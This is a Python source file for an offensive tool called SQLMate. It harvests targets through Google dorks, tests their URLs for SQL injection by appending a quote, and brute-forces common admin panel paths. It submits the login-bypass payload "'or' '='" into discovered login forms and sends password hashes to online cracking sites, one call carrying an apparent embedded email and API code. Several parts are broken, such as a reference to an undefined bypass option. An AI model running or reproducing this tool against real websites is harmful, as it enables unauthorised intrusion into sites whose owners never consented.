#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from bs4 import BeautifulSoup
import requests
from re import search, findall
from urllib.parse import unquote
from html.parser import HTMLParser
from urllib.parse import urlparse
import mechanize
import datetime
import argparse
import sys

print('''\033[1;93m
        ___
       __H__         _       
 ___ ___|\033[41m.\033[0m\033[1;93m|_____ ___| |_ ___  \033[1;97m{\033[90m0.8#stable\033[1;97m}\033[1;93m
|_ -| . |\033[41m.\033[0m\033[1;93m|     | .'|  _| -_|
|___|_  |\033[41m.\033[0m\033[1;93m|_|_|_|__,|_| |___|
      |_|V                    \033[0m\033[4;37mteamultimate.in\033[0m
''')

parser = argparse.ArgumentParser()
parser.add_argument("--dork", help="Supply a dork and let SQLMate do its thing", dest='dork', nargs='+')
parser.add_argument("--hash", help="'Crack' a hash in 5 secs", dest='hash')
parser.add_argument("--list", help="Import and crack hashes from a txt file", dest='hashlist', metavar='<path>')
parser.add_argument("--dump", help="Get dorks. Specify dumping level. Level 1 = 20 dorks", dest='page', metavar='1-184')
parser.add_argument("--admin", help="Find admin panel of website", dest='admin', metavar='URL')
parser.add_argument("--type", help="Choose extension to scan (Use with --admin option, Default is all)", dest='type', metavar='PHP,ASP,HTML')
args = parser.parse_args()
if args.dork:
    ' '.join(args.dork)

if not args.dork and not args.hash and not args.hashlist and not args.admin and not args.page:
    help_text = parser.format_help()
    help_text = help_text.replace('[DORK ...]\n','').replace('              ','').replace(' [DORK ...]','')
    help_text = help_text.replace('Default','\t\tDefault')
    print(help_text)
    print('')
    args.dork = 'Blank'

br = mechanize.Browser()

wordlist = ['admin/', 'admin.php', 'administrator/', 'login.php', 'login/', 'login.html', 'admin.html', 'admin/admin.php',
'admin_login.php', 'admin/account.php', 'admin/login.php', 'login/login.php', 'login/admin.php']

paths = []
targets = []
vul_targets = []
logins = []
null = []
num = 0
hashes = []
cracked = []
start = ['0', '10', '20', '30']
dorks = []

def google(dork, number):
    url = 'https://www.google.co.in/search?q=' + dork + '&start=' + number
    r  = requests.get(url)
    data = r.text
    if 'Our systems have detected unusual traffic from your computer network' in data:
        print("\033[1;31m[-]\033[0m Captcha Detected!")
        google = 'https://www.google.co.in/search?q=' + dork + '&start=' + number
        url = 'http://source.domania.net/cgi-bin/source.cgi'
        data = requests.post(url, data='url='+google).text
        data = HTMLParser().unescape(data)
        if 'Our systems have detected unusual traffic from your computer network' in data:
            print("\033[1;31m[-]\033[0m Google blocked our IP! Are you mad bro? Take a break.")
        match = search(r'url\?q=[^<]*&amp;', data)
        if match:
            clean_link = unquote(unquote(match.group().split('url?q=')[1][:-5]))
            targets.append(clean_link)
        else:
            pass
    soup = BeautifulSoup(data, 'html.parser')
    links = soup.find_all("h3")
    if len(links) == 0:
        pass
    for row in links:
        for link in row.find_all("a"):
            source = (link.get('href'))
            match = search(r'/url\?q=[^<]*&sa=', source)
            if match:
                clean_link = unquote(unquote(match.group().split('/url?q=')[1][:-4]))
                if '=' in clean_link:
                    targets.append(clean_link)
                else:
                    pass
    if len(links) < 10:
        null.append(1)

def admin():
    for link in vul_targets:
        parsed_uri = urlparse(link)
        domain = '{uri.scheme}://{uri.netloc}/'.format(uri=parsed_uri)
        for suffix in wordlist:
            try:
                response = domain + suffix
                r = requests.get(response)
                http = r.status_code
                if http == 200:
                    print('\033[1;32m[+]\033[0m Admin panel found: %s' % response)
                    logins.append(response)
                    break
                else:
                    pass
            except:
                pass

def admin_e(link):
    for suffix in paths:
        try:
            response = link + suffix
            r = requests.get(response)
            http = r.status_code
            if http == 200:
                print('\033[1;32m[+]\033[0m Admin panel found: %s' % response)
            else:
                print('\033[1;31m[-]\033[1;0m %s' % response)
        except:
            pass

def get_paths(type):
    try:
        with open('paths.txt','r') as wordlist:
            for path in wordlist:
                path = str(path.replace("\n",""))
                try:
                    if 'asp' in type:
                        if 'html' in path or 'php' in path:
                            pass
                        else:
                            paths.append(path)
                    if 'php' in type:
                        if 'asp' in path or 'html' in path:
                            pass
                        else:
                            paths.append(path)
                    if 'html' in type:
                        if 'asp' in path or 'php' in path:
                            pass
                        else:
                            paths.append(path)
                except:
                    paths.append(path)
    except IOError:
        print("\033[1;31m[-]\033[1;m paths.txt not found!")
        quit()

def get_dorks(page):
    for page in range(int(page)):
        print("\033[1;32m[+]\033[0m Finding dorks on page %i"%(page + 1))
        url = 'https://cxsecurity.com/dorks/' + str(page)
        response = requests.get(url).text
        response = HTMLParser().unescape(response)
        response = str(response)
        matches = findall(r'<B>Dork:</B>[^<]*</font>', response)
        if matches:
            for match in matches:
                try:
                    match = match.replace('<B>Dork:</B>', '').replace('</font>','')
                    dorks.append(match)
                except:
                    pass
    now = datetime.datetime.now()
    filename = ("dorks%i:%i.txt"%(now.hour,now.minute))
    with open(filename, "a") as f:
        for dork in dorks:
            f.write(dork + '\n')
    print('\033[1;32m[+]\033[0m Dorks dumped in %s' % filename)

def bypass():
    def find(url, i_title, original):
        form_number = 0
        for f in forms:
            data = str(f)
            username = search(r'<TextControl\([^<]*=\)>', data)
            if username:
                username = (username.group().split('<TextControl(')[1][:-3])
                passwd = search(r'<PasswordControl\([^<]*=\)>', data)
                if passwd:
                    passwd = (passwd.group().split('<PasswordControl(')[1][:-3])
                    select_n = search(r'SelectControl\([^<]*=', data)
                    if select_n:
                        name = (select_n.group().split('(')[1][:-1])
                        select_o = search(r'SelectControl\([^<]*=[^<]*\)>', data)
                        if select_o:
                            menu = "True"
                            options = (select_o.group().split('=')[1][:-1])
                            print('\n\033[1;33m[!]\033[0m A drop down menu detected.')
                            print('\033[1;33m[!]\033[0m Menu name: ' + name)
                            print('\033[1;33m[!]\033[0m Options available: ' + options)
                            option = input('\033[1;34m[?]\033[0m Please Select an option:>> ')
                            brute(username, passwd, menu, option, name, form_number, i_title, original)
                        else:
                            menu = "False"
                            brute(username, passwd, menu, option, name, form_number, i_title, original)
                    else:
                        menu = "False"
                        option = ""
                        name = ""
                        brute(username, passwd, menu, option, name, form_number, i_title, original)
                else:
                    form_number = form_number + 1
            else:
                form_number = form_number + 1

    def brute(username, passwd, menu, option, name, form_number, i_title, original):
        br.open(url)
        br.select_form(nr=form_number)
        br.form[username] = "'or' '='"
        br.form[passwd] = "'or' '='"
        if menu == "False":
            pass
        elif menu == "True":
            br.form[name] = [option]
        else:
            pass
        resp = br.submit()
        data = resp.read()
        data_low = data.decode().lower()
        if 'username or password' in data_low:
            pass
        else:
            soup =  BeautifulSoup(data, 'lxml')
            i_title = soup.find('title')
            if i_title == None:
                data = data_low
                if 'logout' in data:
                    print('\n\033[1;32m[+]\033[0m Login page is vulnerable to SQLi')
                else:
                    pass
            else:
                injected = i_title.contents
                if original != injected:
                    print('\n\033[1;32m[+]\033[0m Login page is vulnerable to SQLi')
                else:
                    pass
    for url in logins:
        br.open(url)
        data = br.open(url).read()
        forms = br.forms()
        soup =  BeautifulSoup(data, 'lxml')
        i_title = soup.find('title')
        original = None
        if i_title != None:
            original = i_title.contents
        find(url, i_title, original)

def scan():
    for url in targets:
        try:
            response = requests.get(url + "'", timeout=5).text
            if 'error' in response and 'syntax' in response or 'MySQL' in response:
                print('\033[1;32m[+]\033[0m ' + url)
                vul_targets.append(url)
            else:
                print('\033[1;31m[-]\033[0m ' + url)
        except:
              pass

def HashBuster(hashvalue):
    def omega(hashvalue):
        data = {"hash":hashvalue, "decrypt":"Decrypt"}
        html = requests.post("http://md5decrypt.net/en/Sha256/", data=data)
        find = html.text
        match = search (r'<b>[^<]*</b><br/><br/>', find)
        if match:
            print("\033[1;32m[+]\033[0m %s : " % hashvalue, match.group().split('<b>')[1][:-14])
        else:
            cracked.append(1)

    def Lambda(hashvalue):
        html = requests.get("http://md5decrypt.net/Api/api.php?hash="+hashvalue+"&hash_type=sha256&email=deanna_abshire@proxymail.eu&code=1152464b80a61728")
        find = html.text
        if len(find) > 0:
            print("\033[1;32m[+]\033[0m %s : " % hashvalue, find)
        else:
            cracked.append(1)

    def beta(hashvalue):
        data = {"auth":"8272hgt", "hash":hashvalue, "string":"","Submit":"Submit"}
        html = requests.post("http://hashcrack.com/index.php" , data=data)
        find = html.text
        match = search (r'<span class=hervorheb2>[^<]*</span></div></TD>', find)
        if match:
            print("\033[1;32m[+]\033[0m %s : " % hashvalue, match.group().split('hervorheb2>')[1][:-18])
        else:
            omega(hashvalue)
    if len(hashvalue) == 32:
        data = {"hash":hashvalue,"submit":"Decrypt It!"}
        html = requests.post("http://md5decryption.com", data=data)
        find = html.text
        match = search(r"Decrypted Text: </b>[^<]*</font>", find)
        if match:
            print("\033[1;32m[+]\033[0m %s : " % hashvalue, match.group().split('b>')[1][:-7])
        elif match == None:
            data = {"md5":hashvalue,"x":"21","y":"8"}
            html = requests.post("http://md5.my-addr.com/md5_decrypt-md5_cracker_online/md5_decoder_tool.php", data=data)
            find = html.text
            match = search (r"<span class='middle_title'>Hashed string</span>: [^<]*</div>", find)    
            if match:
                print("\033[1;32m[+]\033[0m %s : " % hashvalue, match.group().split('span')[2][3:-6])
            else:
                beta(hashvalue)
        else:
            beta(hashvalue)
    elif len(hashvalue) == 40:
        omega(hashvalue)
    else:
        Lambda(hashvalue)

def list():
    try:
        with open(args.hashlist, 'r') as hashes:
            for hashvalue in hashes:
                hashvalue = hashvalue.replace("\n","")
                hashes.append(hashvalue)
    except IOError:
        print("\033[1;31m[-]\033[0m Hash list not found!")
        quit()

if args.dork:
    for number in start:
        google(args.dork, number)
    if len(null) > 0:
        print("\033[1;31m[-]\033[0m No more Google results to scan")
        quit()
    else:
        print("\033[1;32m[+]\033[0m Google search done. Starting scan...")
        scan()
        print("\033[1;32m[+]\033[0m Scanning done!")
        if len(vul_targets) > 0:
            print("\033[1;32m[+]\033[0m The following sites are vulnerable to SQL injection:")
            for vul in vul_targets:
                print("\033[1;32m[+]\033[0m " + vul)
            if args.admin:
                admin()
                if args.type:
                    get_paths(args.type)
                    for link in logins:
                        admin_e(link)
        if args.bypass:
            bypass()
        else:
            pass
elif args.hash:
    HashBuster(args.hash)
elif args.hashlist:
    list()
    if len(hashes) > 0:
        for hashvalue in hashes:
            HashBuster(hashvalue)
elif args.admin:
    admin()
    if args.type:
        get_paths(args.type)
        for link in logins:
            admin_e(link)
elif args.page:
    get_dorks(args.page)
else:
    pass
